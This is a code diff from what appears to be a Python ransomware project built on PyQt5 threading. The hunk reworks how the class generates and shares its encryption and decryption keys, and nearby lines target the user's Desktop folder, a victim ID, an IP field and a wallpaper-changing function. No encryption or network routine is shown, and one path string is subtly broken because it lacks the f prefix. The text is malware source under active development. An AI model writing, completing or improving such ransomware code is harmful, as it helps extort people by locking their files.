@@ -86,14 +86,23 @@ def set_wallpaper(image_filename):
 
 # Define RW Class for functionality
 class Ransomware(PyQt5.QtCore.QRunnable):  # defines class that inherits from pyqt, runnable object 4 multithreading
-    # encryptionPass = None # keep commented , need to globalize
-    # decryptionPass = None # keep commented, need to globalize
+
+    encryptionPass = None
+    decryptionPass = None
+
     def __init__(self):  # Constructor, inits Ransomware object in pyqt multithread envriroment
         super(Ransomware, self).__init__()  # calls the constructor of qrunnable for intialization
         self.threadpool = PyQt5.QtCore.QThreadPool()  # creates an instance of Qthreadpool( manages pools of threads)
         self.randomId = self.rID(12)  # generates a randID 12 length using rID method
-        self.encryptionPass = self.rSeed(32)  # generates random seed 32 length using rSeed
-        self.decryptionPass = self.rSeed(32)
+        # Use the class-level encryption and decryption keys if they are set
+        if Ransomware.encryptionPass is None:
+            Ransomware.encryptionPass = self.rSeed(32)
+        if Ransomware.decryptionPass is None:
+            Ransomware.decryptionPass = self.rSeed(32)
+        self.encryptionPass = Ransomware.encryptionPass
+        self.decryptionPass = Ransomware.decryptionPass
+        # self.encryptionPass = self.rSeed(32)        # generates random seed 32 length using rSeed
+        # self.decryptionPass = self.rSeed(32)
         print(f"Decryption key generated: {self.decryptionPass}")  # Print decryption key
         self.filePath = "C:\\Users\\{self.userName}\\Desktop\\"  # sets file path attribute
         self.ip = ""  # inits ip attribute to empty string 4 later
